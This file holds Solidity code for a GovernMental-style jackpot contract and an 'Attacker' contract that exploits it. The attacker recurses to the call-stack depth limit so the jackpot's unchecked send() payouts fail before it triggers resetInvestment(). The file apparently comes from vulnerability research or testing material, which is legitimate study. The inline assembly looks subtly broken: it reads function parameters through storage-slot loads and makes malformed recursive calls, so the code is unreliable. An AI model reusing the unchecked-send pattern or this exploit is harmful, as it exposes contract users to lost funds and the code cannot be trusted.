pragma solidity ^0.4.0;

contract Governmental {
    address public O;
    address public LI;
    uint public J = 1 ether;
    uint public LIT;
    uint public OM = 1 minutes;

    function Governmental() {
        O = msg.sender;
        assembly {
            if lt(callvalue, 1000000000000000000) { revert(0, 0) }
        }
    }

    function invest() {
        assembly {
            if lt(callvalue, div(sload(J_slot), 2)) { revert(0, 0) }
        }
        LI = msg.sender;
        J += msg.value / 2;
        LIT = block.timestamp;
    }

    function resetInvestment() {
        assembly {
            if lt(timestamp, add(sload(LIT_slot), sload(OM_slot))) { revert(0, 0) }
        }

        LI.send(J);
        O.send(this.balance - 1 ether);

        LI = 0;
        J = 1 ether;
        LIT = 0;
    }
}

contract Attacker {

    function attack(address T, uint C) {
        assembly {
            if and(lt(0, sload(C_slot)), lt(sload(C_slot), 1023)) {
                let g := sub(gas, 2000)
                call(g, address, 0, 0, 0, 0, 0)
            }
            if eq(sload(C_slot), 1023) {
                call(gas, T, 0, 0, 0, 0, 0)
            }
        }
        Governmental(T).resetInvestment();
    }
}